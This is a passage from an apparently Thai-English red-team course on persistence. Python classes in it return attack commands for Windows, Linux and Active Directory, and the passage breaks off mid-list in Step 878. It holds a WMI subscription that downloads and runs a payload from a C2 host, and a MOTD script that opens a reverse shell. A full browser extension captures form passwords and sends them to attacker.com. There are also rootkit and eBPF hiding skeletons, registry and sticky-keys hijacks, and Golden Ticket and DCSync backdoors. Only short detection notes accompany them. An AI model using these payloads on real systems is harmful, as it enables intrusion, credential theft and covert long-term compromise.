# Part 88: Advanced Persistence Techniques (Steps 871-880)

## ภาพรวม
เทคนิคการสร้าง persistence ขั้นสูงจาก Red Team perspective เพื่อคงความเข้าถึงระบบหลังจากเอาชนะใจได้แล้ว

---

## Step 871: Persistence Fundamentals

หลักการและประเภทของ Persistence

```python
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

class PersistenceCategory(Enum):
    BOOT_LOGON = "Boot/Logon Autostart"
    ACCOUNT_MANIPULATION = "Account Manipulation"
    SCHEDULED_TASKS = "Scheduled Tasks/Jobs"
    SERVER_SOFTWARE = "Server Software Component"
    HIJACK_EXECUTION = "Hijack Execution Flow"
    PRE_OS_BOOT = "Pre-OS Boot"
    BROWSER_EXTENSIONS = "Browser Extensions"
    IMPLANT_CONTAINER = "Implant Container Image"

@dataclass
class PersistenceMechanism:
    name: str
    category: PersistenceCategory
    os: str  # Windows, Linux, macOS, Cross-platform
    mitre_id: str
    detection_difficulty: str  # Low, Medium, High
    requirements: List[str]
    description: str

class PersistenceFramework:
    """กรอบการทำงานสำหรับ Advanced Persistence"""
    
    PERSISTENCE_MATRIX = [
        PersistenceMechanism(
            name="Registry Run Key",
            category=PersistenceCategory.BOOT_LOGON,
            os="Windows",
            mitre_id="T1547.001",
            detection_difficulty="Low",
            requirements=["User-level access"],
            description="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        ),
        PersistenceMechanism(
            name="Scheduled Task",
            category=PersistenceCategory.SCHEDULED_TASKS,
            os="Windows",
            mitre_id="T1053.005",
            detection_difficulty="Medium",
            requirements=["User access for user task, Admin for system task"],
            description="schtasks /create for automated execution"
        ),
        PersistenceMechanism(
            name="WMI Event Subscription",
            category=PersistenceCategory.BOOT_LOGON,
            os="Windows",
            mitre_id="T1546.003",
            detection_difficulty="High",
            requirements=["Admin access"],
            description="Fileless persistence via WMI subscriptions"
        ),
        PersistenceMechanism(
            name="Cron Job",
            category=PersistenceCategory.SCHEDULED_TASKS,
            os="Linux",
            mitre_id="T1053.003",
            detection_difficulty="Low",
            requirements=["User access"],
            description="/etc/cron* or user crontab"
        ),
        PersistenceMechanism(
            name="systemd Service",
            category=PersistenceCategory.BOOT_LOGON,
            os="Linux",
            mitre_id="T1543.002",
            detection_difficulty="Medium",
            requirements=["Root or sudo access"],
            description="Create malicious .service unit file"
        ),
        PersistenceMechanism(
            name="SSH Authorized Keys",
            category=PersistenceCategory.ACCOUNT_MANIPULATION,
            os="Linux/macOS",
            mitre_id="T1098.004",
            detection_difficulty="Low",
            requirements=["Write access to ~/.ssh/"],
            description="Add attacker public key to authorized_keys"
        ),
        PersistenceMechanism(
            name="DLL Search Order Hijacking",
            category=PersistenceCategory.HIJACK_EXECUTION,
            os="Windows",
            mitre_id="T1574.001",
            detection_difficulty="High",
            requirements=["Write access to application directory"],
            description="Place malicious DLL in higher-priority search path"
        ),
        PersistenceMechanism(
            name="BITS Jobs",
            category=PersistenceCategory.BOOT_LOGON,
            os="Windows",
            mitre_id="T1197",
            detection_difficulty="High",
            requirements=["User access"],
            description="Background Intelligent Transfer Service for fileless persistence"
        )
    ]
    
    def select_persistence(self, os_type: str, access_level: str,
                           stealth_required: bool) -> List[PersistenceMechanism]:
        """Select appropriate persistence based on constraints"""
        results = []
        for mech in self.PERSISTENCE_MATRIX:
            # Filter by OS
            if os_type.lower() not in mech.os.lower():
                continue
            # Filter by access level
            if access_level == "user":
                if "Admin" in " ".join(mech.requirements) or "Root" in " ".join(mech.requirements):
                    continue
            # Filter by stealth
            if stealth_required and mech.detection_difficulty == "Low":
                continue
            results.append(mech)
        return results

if __name__ == '__main__':
    fw = PersistenceFramework()
    print(f"Total persistence mechanisms: {len(fw.PERSISTENCE_MATRIX)}")
    
    # Select for stealth Linux persistence
    stealth_linux = fw.select_persistence("linux", "root", stealth_required=True)
    print(f"\nStealth Linux persistence options: {len(stealth_linux)}")
    for mech in stealth_linux:
        print(f"  - {mech.name} ({mech.mitre_id})")
    
    # Windows user-level
    win_user = fw.select_persistence("windows", "user", stealth_required=False)
    print(f"\nWindows user-level options: {len(win_user)}")
    for mech in win_user:
        print(f"  - {mech.name}: {mech.description}")
```

---

## Step 872: Windows Registry Persistence

เทคนิค persistence ผ่าน Windows Registry

```python
from typing import List, Dict

class WindowsRegistryPersistence:
    """เทคนิค Windows Registry Persistence"""
    
    # Registry locations for persistence
    PERSISTENCE_LOCATIONS = {
        "user_run": {
            "key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "access": "User",
            "trigger": "User login",
            "stealth": "Low"
        },
        "machine_run": {
            "key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            "access": "Admin",
            "trigger": "Any user login",
            "stealth": "Low"
        },
        "user_runonce": {
            "key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "access": "User",
            "trigger": "Next login (single execution)",
            "stealth": "Low"
        },
        "screensaver": {
            "key": r"HKCU\Control Panel\Desktop",
            "values": {"SCRNSAVE.EXE": "C:\\malware.scr"},
            "access": "User",
            "trigger": "Screensaver activation",
            "stealth": "Medium"
        },
        "print_monitor": {
            "key": r"HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors",
            "access": "Admin",
            "trigger": "Print Spooler service start",
            "stealth": "High"
        },
        "com_hijack": {
            "key": r"HKCU\Software\Classes\CLSID\{GUID}\InprocServer32",
            "access": "User",
            "trigger": "COM object instantiation",
            "stealth": "High"
        },
        "netsh_helper": {
            "key": r"HKLM\SYSTEM\CurrentControlSet\Services\NetSh",
            "access": "Admin",
            "trigger": "Network commands",
            "stealth": "High"
        }
    }
    
    def registry_persistence_commands(self) -> Dict[str, str]:
        """PowerShell/cmd commands for registry persistence"""
        return {
            "add_run_key_ps": (
                'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '-Name "WindowsUpdate" -Value "C:\\ProgramData\\update.exe" -PropertyType String'
            ),
            "add_run_key_reg": (
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                '/v WindowsUpdate /t REG_SZ /d C:\\ProgramData\\update.exe /f'
            ),
            "query_run_keys": (
                'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            ),
            "delete_run_key": (
                'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                '/v WindowsUpdate /f'
            ),
            "screensaver_persist": (
                'reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE '
                '/t REG_SZ /d C:\\Windows\\System32\\calc.exe /f'
            )
        }
    
    def image_file_execution_options(self) -> str:
        """เทคนิค IFEO hijacking สำหรับ persistence"""
        return """
# Image File Execution Options (IFEO) - Debugger Hijacking
# Requires: Admin
# Trigger: When target executable is launched

# Set debugger for sethc.exe (Sticky Keys)
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f

# Set debugger for utilman.exe (Ease of Access)
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /v Debugger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f

# Now pressing Win+U at login screen spawns cmd as SYSTEM
# This is also a privilege escalation vector (T1546.012)
        """
    
    def detection_methods(self) -> List[str]:
        return [
            "Monitor Run/RunOnce key changes (Sysmon Event ID 13)",
            "Autoruns tool (Sysinternals) - scans all persistence locations",
            "PowerShell: Get-ItemProperty HKCU:\\...\\Run",
            "Event ID 4657 - Registry value modified",
            "Baseline comparison with clean system registry"
        ]

if __name__ == '__main__':
    persist = WindowsRegistryPersistence()
    print("Registry Persistence Locations:")
    for name, info in persist.PERSISTENCE_LOCATIONS.items():
        print(f"  {name}: {info['key']} [Access: {info['access']}, Stealth: {info['stealth']}]")
    
    print("\nPersistence Commands:")
    cmds = persist.registry_persistence_commands()
    for name, cmd in cmds.items():
        print(f"  {name}: {cmd[:80]}...")
```

---

## Step 873: WMI Event Subscription Persistence

เทคนิค persistence ผ่าน WMI Subscriptions ที่ไม่มีไฟล์

```python
from typing import Dict, List

class WMIPersistence:
    """ผ่าน WMI Event Subscription สำหรับ Fileless Persistence"""
    
    # WMI subscription components
    WMI_SUBSCRIPTION_COMPONENTS = {
        "EventFilter": "Defines the trigger condition (when to fire)",
        "EventConsumer": "Defines the action (what to run)",
        "FilterToConsumerBinding": "Links Filter to Consumer"
    }
    
    def create_wmi_persistence_ps(self, command: str, trigger: str = "startup") -> str:
        """PowerShell script to create WMI persistence"""
        if trigger == "startup":
            query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        elif trigger == "user_login":
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
        
        return f"""
$Filter = Set-WmiInstance -Namespace 'root/subscription' -Class '__EventFilter' -Arguments @{{
    Name = 'WindowsSecurityFilter'
    EventNameSpace = 'root/cimv2'
    QueryLanguage = 'WQL'
    Query = '{query}'
}}

$Consumer = Set-WmiInstance -Namespace 'root/subscription' -Class 'CommandLineEventConsumer' -Arguments @{{
    Name = 'WindowsSecurityConsumer'
    CommandLineTemplate = '{command}'
}}

Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments @{{
    Filter = $Filter
    Consumer = $Consumer
}}

Write-Host 'WMI Persistence created'
        """
    
    def list_wmi_subscriptions_ps(self) -> str:
        """PowerShell to list and investigate WMI subscriptions"""
        return """
# List all event filters
Get-WMIObject -Namespace root/subscription -Class __EventFilter | Select Name, Query

# List all event consumers
Get-WMIObject -Namespace root/subscription -Class __EventConsumer | Select Name, CommandLineTemplate

# List all bindings
Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding

# Remove WMI persistence
$Filter = Get-WMIObject -Namespace root/subscription -Class __EventFilter -Filter "Name='WindowsSecurityFilter'"
$Consumer = Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='WindowsSecurityConsumer'"
$Binding = Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding

$Binding | Remove-WmiObject
$Consumer | Remove-WmiObject
$Filter | Remove-WmiObject
        """
    
    def wmi_attack_persistence_mof(self) -> str:
        """MOF file for WMI subscription (alternative method)"""
        return """
// malicious.mof - Compile with: mofcomp malicious.mof
#pragma namespace ("root\\subscription")

Instance of __EventFilter as $Filter
{
    Name = "EvilFilter";
    EventNameSpace = "root\\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
            "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
};

Instance of CommandLineEventConsumer as $Consumer
{
    Name = "EvilConsumer";
    CommandLineTemplate = "powershell -enc BASE64PAYLOAD";
};

Instance of __FilterToConsumerBinding
{
    Filter = $Filter;
    Consumer = $Consumer;
};
        """
    
    def detection_and_defense(self) -> Dict[str, List[str]]:
        return {
            "detection": [
                "Monitor WMI activity logs: Win32_EventFilter/Consumer/Binding",
                "Sysmon Event ID 19,20,21 (WMI Event Activity)",
                "Query: Get-WMIObject -Namespace root/subscription -Class __EventFilter",
                "Autoruns: checks WMI subscriptions",
                "Microsoft-Windows-WMI-Activity/Operational event log"
            ],
            "defense": [
                "Restrict WMI access with DCOM permissions",
                "Audit WMI namespace access",
                "Block PowerShell Set-WmiInstance for non-admins",
                "Monitor for mofcomp.exe execution"
            ]
        }

if __name__ == '__main__':
    wmi = WMIPersistence()
    print("WMI Subscription Components:")
    for comp, desc in wmi.WMI_SUBSCRIPTION_COMPONENTS.items():
        print(f"  {comp}: {desc}")
    
    print("\nPowerShell WMI Persistence Script:")
    script = wmi.create_wmi_persistence_ps(
        command="powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://c2/payload')\"",
        trigger="startup"
    )
    print(script[:500])
```

---

## Step 874: Linux Systemd & Cron Persistence

เทคนิค persistence บน Linux

```python
from typing import Dict, List

class LinuxPersistence:
    """เทคนิค persistence สำหรับ Linux"""
    
    def systemd_service_persistence(self, service_name: str, command: str) -> Dict[str, str]:
        """Create malicious systemd service"""
        service_content = f"""
[Unit]
Description=System Security Monitor
After=network.target

[Service]
Type=simple
ExecStart={command}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
        """
        
        install_cmds = [
            f"# Write service file",
            f"cat > /etc/systemd/system/{service_name}.service << 'EOF'",
            service_content,
            "EOF",
            f"# Enable and start",
            f"systemctl daemon-reload",
            f"systemctl enable {service_name}.service",
            f"systemctl start {service_name}.service"
        ]
        
        return {
            "service_file": f"/etc/systemd/system/{service_name}.service",
            "content": service_content,
            "install_commands": "\n".join(install_cmds),
            "verify": f"systemctl status {service_name}"
        }
    
    def cron_persistence_options(self) -> List[Dict]:
        """Various cron persistence locations"""
        return [
            {
                "location": "/etc/crontab",
                "access": "root",
                "format": "MINUTE HOUR DOM MONTH DOW USER COMMAND",
                "example": "*/5 * * * * root /tmp/.backdoor"
            },
            {
                "location": "/etc/cron.d/",
                "access": "root",
                "format": "Standard crontab with user field",
                "example": "@reboot root /tmp/.backdoor"
            },
            {
                "location": "/etc/cron.hourly/",
                "access": "root",
                "format": "Executable script file",
                "example": "Place executable in this directory"
            },
            {
                "location": "/var/spool/cron/crontabs/<user>",
                "access": "user",
                "format": "User-specific crontab",
                "example": "*/10 * * * * /home/user/.config/update.sh"
            },
            {
                "location": "~/.bashrc or ~/.bash_profile",
                "access": "user",
                "format": "Shell initialization",
                "example": "(nohup /tmp/.backdoor &) 2>/dev/null"
            }
        ]
    
    def ldso_preload_persistence(self, malicious_lib: str = "/tmp/libmalware.so") -> str:
        """LD_PRELOAD for function hooking persistence"""
        return f"""
# Method 1: /etc/ld.so.preload (root required)
echo '{malicious_lib}' >> /etc/ld.so.preload

# Method 2: User-level via LD_PRELOAD in .bashrc
echo 'export LD_PRELOAD={malicious_lib}' >> ~/.bashrc

# Method 3: PAM module (root required)
# Add malicious PAM module to /etc/pam.d/common-auth
# echo 'session optional /lib/x86_64-linux-gnu/libmalware.so' >> /etc/pam.d/common-session

# Malicious library must export: 
# __attribute__((constructor)) void init() {{ ... }}
# Or hook existing functions like getuid(), read(), etc.
        """
    
    def ssh_authorized_keys_persistence(self) -> Dict[str, str]:
        """SSH persistence via authorized_keys"""
        return {
            "generate_key": "ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ''",
            "add_to_target": "echo $(cat /tmp/backdoor_key.pub) >> ~/.ssh/authorized_keys",
            "restrict_options": (
                'echo \'command="/bin/bash",no-pty,no-agent-forwarding '
                '"ssh-ed25519 AAAA..." backdoor\' >> ~/.ssh/authorized_keys'
            ),
            "connect": "ssh -i /tmp/backdoor_key user@target",
            "stealthy_location": "Place key in /root/.ssh/authorized_keys2 (less monitored)",
            "detection": "Monitor ~/.ssh/authorized_keys and /root/.ssh/authorized_keys for changes"
        }
    
    def motd_persistence(self) -> str:
        """Persistence via /etc/update-motd.d/ (root)"""
        return """
# MOTD scripts execute at SSH login
cat > /etc/update-motd.d/99-security-check << 'EOF'
#!/bin/bash
# Security check
(nohup bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 &) 2>/dev/null
EOF
chmod +x /etc/update-motd.d/99-security-check
        """

if __name__ == '__main__':
    persist = LinuxPersistence()
    print("Systemd Service Persistence:")
    svc = persist.systemd_service_persistence(
        "system-monitor",
        "/usr/bin/python3 -c 'import socket; ...' "
    )
    print(f"  Service file: {svc['service_file']}")
    print(f"  Content preview: {svc['content'][:100]}...")
    
    print("\nCron Persistence Locations:")
    for cron in persist.cron_persistence_options():
        print(f"  {cron['location']} [Access: {cron['access']}]")
```

---

## Step 875: DLL Hijacking & COM Hijacking

เทคนิค DLL Hijacking และ COM Object Hijacking

```python
from typing import List, Dict
import os

class HijackingTechniques:
    """เทคนิค DLL และ COM hijacking"""
    
    # DLL search order (Windows default)
    DLL_SEARCH_ORDER = [
        "1. Application's directory",
        "2. System directory (C:\\Windows\\System32)",
        "3. 16-bit system directory",
        "4. Windows directory (C:\\Windows)",
        "5. Current working directory",
        "6. Directories in PATH environment variable"
    ]
    
    # Common vulnerable DLL hijacking targets
    HIJACKING_TARGETS = [
        {
            "app": "Windows Search (SearchUI.exe)",
            "missing_dll": "MsftEdit.dll",
            "location": "%ProgramFiles%\\Common Files\\microsoft shared\\",
            "mitre": "T1574.001"
        },
        {
            "app": "Various apps using LoadLibrary",
            "missing_dll": "wlbsctrl.dll",
            "location": "C:\\Windows\\System32\\",
            "mitre": "T1574.001"
        },
        {
            "app": "Custom applications",
            "missing_dll": "Any missing DLL in app directory",
            "location": "Application install directory",
            "mitre": "T1574.001"
        }
    ]
    
    def find_dll_hijacking_opportunities(self) -> str:
        """Use Process Monitor to find DLL hijacking opportunities"""
        return """
# Step 1: Run Process Monitor (Sysinternals) and set filters:
# Path contains .dll
# Result is NAME NOT FOUND
# Process Name = target_app.exe

# Step 2: Analyze which missing DLLs are in writable locations
# procmon.exe /LoadConfig procmon_filter.pmc /BackingFile procmon_output.pml

# Step 3: Create malicious DLL with appropriate exports
# cl /LD malicious.cpp /Fe:missing.dll

# Step 4: Place in the directory checked before System32
# e.g., if app loads MissingDLL.dll from current dir:
# copy malicious.dll C:\\AppDir\\MissingDLL.dll

# PowerShell DLL hijack finder:
Get-Process | ForEach-Object {
    $process = $_
    $modules = $process.Modules
    foreach ($mod in $modules) {
        if (-not (Test-Path $mod.FileName)) {
            Write-Host "Missing DLL: $($mod.FileName) in $($process.Name)"
        }
    }
}
        """
    
    def com_hijacking(self) -> Dict[str, str]:
        """COM Object hijacking without admin"""
        return {
            "concept": (
                "HKCU\\Software\\Classes\\CLSID takes precedence over "
                "HKCR\\CLSID (system-wide). Users can create HKCU entries."
            ),
            "find_targets": (
                # Find COM objects in HKLM that are not in HKCU
                "Get-ItemProperty HKLM:\\Software\\Classes\\CLSID -ErrorAction SilentlyContinue | "
                "Where-Object {$_.InprocServer32} | Select-Object PSChildName"
            ),
            "create_hijack": (
                'New-Item -Path "HKCU:\\Software\\Classes\\CLSID\\{CLSID-HERE}\\InprocServer32" -Force | '
                'Set-ItemProperty -Name "(Default)" -Value "C:\\path\\to\\malicious.dll"'
            ),
            "find_auto_elevate_com": (
                "Look for COM objects with LocalizedString containing 'ms-resource:' "
                "and AutoElevate=True - these run elevated without UAC"
            ),
            "cleanup": (
                'Remove-Item -Path "HKCU:\\Software\\Classes\\CLSID\\{CLSID-HERE}" -Recurse'
            )
        }
    
    def malicious_dll_template(self) -> str:
        """C++ template for DLL hijacking payload"""
        return """
// malicious_dll.cpp - Compile as DLL
#include <windows.h>

void Payload() {
    // Your payload here
    WinExec("cmd.exe /c whoami > C:\\\\tmp\\\\output.txt", SW_HIDE);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            Payload();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// If original DLL exports are needed (proxy DLL):
// #pragma comment(linker, "/EXPORT:ExportedFunc=originaldll.ExportedFunc")
        """

if __name__ == '__main__':
    hijack = HijackingTechniques()
    print("DLL Search Order:")
    for order in hijack.DLL_SEARCH_ORDER:
        print(f"  {order}")
    
    print("\nCOM Hijacking Steps:")
    for step, desc in hijack.com_hijacking().items():
        print(f"  {step}: {desc[:80]}...")
```

---

## Step 876: Browser Extension Persistence

การใช้ Browser Extensions เป็นช่องทาง persistence

```python
from typing import Dict, List

class BrowserExtensionPersistence:
    """ผ่าน Browser Extensions เพื่อ persistence"""
    
    # Malicious extension manifest (Chrome/Edge)
    CHROME_MANIFEST = """
{
    "manifest_version": 3,
    "name": "Security Helper",
    "version": "1.0",
    "description": "Security monitoring extension",
    "permissions": [
        "activeTab", "tabs", "storage",
        "scripting", "notifications",
        "webRequest", "webRequestBlocking"
    ],
    "host_permissions": ["<all_urls>"],
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"],
        "run_at": "document_idle"
    }]
}
    """
    
    # Background service worker (data exfiltration)
    BACKGROUND_JS = """
// background.js - Runs persistently
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
        // Capture page info when tab loads
        chrome.tabs.sendMessage(tabId, {action: 'capture'});
    }
});

// Receive data from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'credential') {
        // Exfiltrate captured credentials
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(request.data)
        });
    }
});
    """
    
    # Content script (credential harvesting)
    CONTENT_JS = """
// content.js - Injected into every page
(function() {
    // Monitor form submissions
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const inputs = form.querySelectorAll('input[type=password], input[name*=pass], input[name*=user]');
        if (inputs.length > 0) {
            const data = {};
            inputs.forEach(input => {
                data[input.name || input.type] = input.value;
            });
            data.url = window.location.href;
            chrome.runtime.sendMessage({type: 'credential', data: data});
        }
    });
})();
    """
    
    def forced_extension_install_windows(self, ext_id: str) -> str:
        """Force-install Chrome extension via registry (admin)"""
        return f"""
# Force install Chrome extension via Registry (requires admin)
reg add "HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "{ext_id};https://clients2.google.com/service/update2/crx" /f

# Or via Group Policy Object:
# User Configuration > Administrative Templates > Google Chrome > Extensions
# Extension installation force-list: add extension ID
        """
    
    def install_crx_locally(self) -> List[str]:
        """Steps to install unpacked extension locally"""
        return [
            "1. Create extension directory with manifest.json + .js files",
            "2. Go to chrome://extensions/",
            "3. Enable 'Developer mode'",
            "4. Click 'Load unpacked' and select directory",
            "5. Extension is now persistent across browser restarts",
            "6. ID is shown in chrome://extensions/"
        ]
    
    def browser_data_locations(self) -> Dict[str, str]:
        """Browser data file locations for offline extraction"""
        return {
            "chrome_windows": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\\",
            "chrome_linux": "~/.config/google-chrome/Default/",
            "firefox_windows": r"%APPDATA%\Mozilla\Firefox\Profiles\\",
            "firefox_linux": "~/.mozilla/firefox/<profile>/",
            "cookies_file": "Cookies (SQLite)",
            "passwords_file": "Login Data (SQLite, AES encrypted on Windows)",
            "history": "History (SQLite)",
            "bookmarks": "Bookmarks (JSON)"
        }

if __name__ == '__main__':
    ext = BrowserExtensionPersistence()
    print("Chrome Extension Manifest:")
    print(ext.CHROME_MANIFEST[:300])
    print("\nForce Install Steps:")
    for step in ext.install_crx_locally():
        print(f"  {step}")
    print("\nBrowser Data Locations:")
    for browser, path in ext.browser_data_locations().items():
        print(f"  {browser}: {path}")
```

---

## Step 877: Kernel-Level Persistence (Rootkits)

การสร้าง Persistence ระดับ Kernel

```python
from typing import Dict, List

class KernelPersistence:
    """อธิบาย Kernel-level persistence และ rootkits"""
    
    def kernel_module_persistence_linux(self) -> str:
        """Linux kernel module (LKM) rootkit"""
        return """
# Step 1: Write kernel module
cat > rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>

// Hook sys_getdents to hide files starting with '.' in target dirs
// Hook sys_kill to receive commands
// Hook netfilter to hide network connections

static int __init rootkit_init(void) {
    printk(KERN_INFO "Module loaded\n");  // Goes to /var/log/kern.log
    // Hook syscalls, hide processes, etc.
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore hooks
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# Step 2: Compile
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

# Step 3: Load
insmod rootkit.ko

# Step 4: Make persistent (if /etc/modules or modprobe)
echo 'rootkit' >> /etc/modules
cp rootkit.ko /lib/modules/$(uname -r)/
depmod -a
        """
    
    def windows_kernel_driver(self) -> str:
        """Windows kernel driver persistence (TESTSIGNING or exploit)"""
        return """
# Windows Kernel Driver Persistence

# Requirements: Admin + either:
# a) Valid signing certificate (EV code signing)
# b) Test mode (TESTSIGNING = 1)
# c) BYOVD (Bring Your Own Vulnerable Driver) attack

# BYOVD Attack:
# 1. Load a signed vulnerable driver
# 2. Use known vulnerability in it to get kernel execution
# 3. Load unsigned malicious driver or patch kernel directly

# Install driver service:
sc create EvilDriver binPath= C:\\Windows\\System32\\drivers\\evil.sys type= kernel start= boot

# Enable TESTSIGNING (requires admin):
bcdedit /set testsigning on

# After reboot: load unsigned drivers
sc start EvilDriver
        """
    
    def ebpf_for_detection_evasion(self) -> str:
        """eBPF-based evasion (Linux)"""
        return """
# eBPF programs run in kernel space with restricted capabilities
# Can be used for:
# - Hiding network connections from /proc/net/tcp
# - Intercepting syscalls before they reach kernel
# - Hiding processes from ps/top

# Example: Hide process using eBPF
cat > hide_proc.c << 'EOF'
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

// Hook sys_getdents64 to hide specific PID
SEC("kprobe/sys_getdents64")
int hook_getdents(struct pt_regs *ctx) {
    // Filter out target PID from directory listing
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
EOF

# Compile and load:
clang -O2 -target bpf -c hide_proc.c -o hide_proc.o
bpftool prog load hide_proc.o /sys/fs/bpf/hide_proc
        """
    
    def bootkits_overview(self) -> List[str]:
        """Bootkit persistence mechanisms"""
        return [
            "MBR Bootkit: Infect Master Boot Record (BIOS systems)",
            "VBR Bootkit: Infect Volume Boot Record",
            "EFI Bootkit: Modify UEFI firmware/EFI partition (most advanced)",
            "Secure Boot bypass required for EFI bootkits",
            "Examples: Lojax (UEFI), MosaicRegressor, BlackLotus",
            "Detection: UEFI scanning tools, Secure Boot validation"
        ]

if __name__ == '__main__':
    kernel_persist = KernelPersistence()
    print("Linux LKM Rootkit:")
    print(kernel_persist.kernel_module_persistence_linux()[:400])
    print("\nBootkit Overview:")
    for item in kernel_persist.bootkits_overview():
        print(f"  - {item}")
```

---

## Step 878: Active Directory Persistence

เทคนิค Persistence ใน Active Directory

```python
from typing import Dict, List

class ActiveDirectoryPersistence:
    """เทคนิค AD persistence สำหรับ Red Team"""
    
    AD_PERSISTENCE_TECHNIQUES = {
        "DCSync": {
            "description": "Add DCSync rights to non-DC account for password extraction",
            "requirements": "Domain Admin or WriteDACL on domain root",
            "command": (
                # PowerView
                "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' "
                "-PrincipalIdentity 'attacker_user' "
                "-Rights DCSync"
            ),
            "detection": "Monitor for unexpected replication (Event ID 4662)"
        },
        "Golden_Ticket": {
            "description": "Forge Kerberos TGTs with krbtgt hash",
            "requirements": "krbtgt NTLM hash (from DCSync or domain compromise)",
            "command": (
                "# Mimikatz:\n"
                "kerberos::golden /user:Administrator /domain:domain.local "
                "/sid:S-1-5-21-XXX /krbtgt:NTLM_HASH /id:500 /ticket:gold.kirbi\n"
                "kerberos::ptt gold.kirbi"
            ),
            "persistence": "Valid for 10 years by default, survives password changes",
            "detection": "Monitor for TGTs with unusual lifetimes or encryption types"
        },
        "Silver_Ticket": {
            "description": "Forge TGS for specific service",
            "requirements": "Service account NTLM hash",
            "command": (
                "kerberos::golden /user:Admin /domain:domain.local "
                "/sid:S-1-5-21-XXX /target:server.domain.local "
                "/service:cifs /rc4:SERVICE_HASH /ticket:silver.kirbi"
            ),
            "persistence": "Valid without TGT, works offline",
        },
        "AdminSDHolder": {
            "description": "Modify AdminSDHolder ACL to add backdoor rights",
            "requirements": "Domain Admin",
            "command": (
                # AdminSDHolder propagates ACLs to protected accounts hourly
                "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' "
                "-PrincipalIdentity 'attacker' -Rights All"
            ),
            "persistence": "Survives manual ACL removal (re-applied hourly by SDProp)"
        },
        "DSRM_Backdoor": {
            "description": "Abuse Directory Services Restore Mode (DSRM) account",
            "requirements": "Domain Admin on DC",
            "command": (
                "# Reset DSRM password:\n"
                "ntdsutil 'set dsrm password' 'reset password on server null' q q\n"
                "# Enable network logon for DSRM:\n"
                'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2'
            ),
            "persistence": "DSRM account persists even if domain is compromised"
        },
        "SID_History": {
            "description": "Inject privileged SID into account's SID history",
            "requirements": "Domain Admin",
            "command": (
                "# Mimikatz:\n"
                "sid::patch\n"
                "sid::add /sam:attacker /new:Administrator\n"
                "# PowerShell:\n"
                "Set-ADUser attacker_user -Add @{SIDHistory = 'S-1-5-21-XXX-500'}"
            )
        }
    }
    
    def security_descriptor_backdoor(self) -> str:
        """Backdoor security descriptors for WMI/PowerShell remoting"""
        return """
# Allow non-admin user to use PSRemoting:
ConvertFrom-SddlString "O:NSG:BAD:P(A;;GA;;;WD)" | Set-PSSessionConfiguration -Name Microsoft.PowerShell

# Allow non-admin WMI access:
# Use wmimgmt.msc > WMI Control Properties > Security
# Add user to root/CIMV2 with Execute Methods, Remote Enable permissions
        """
    
    def detect_ad_persistence(self) -> List[str]:
        """Detection methods for AD persistence"""
        return [
            "Monitor AdminSDHolder ACL changes",
            "Audit DCSync operations (Event 4662 with replication GUIDs)",
            "Check for accounts with SID History",
            "Monitor DSRM registry key changes",
            "Detect Golden Ticket usage (unusual TGT lifetimes)",
            "Use BloodHound to identify ACL backdoors",
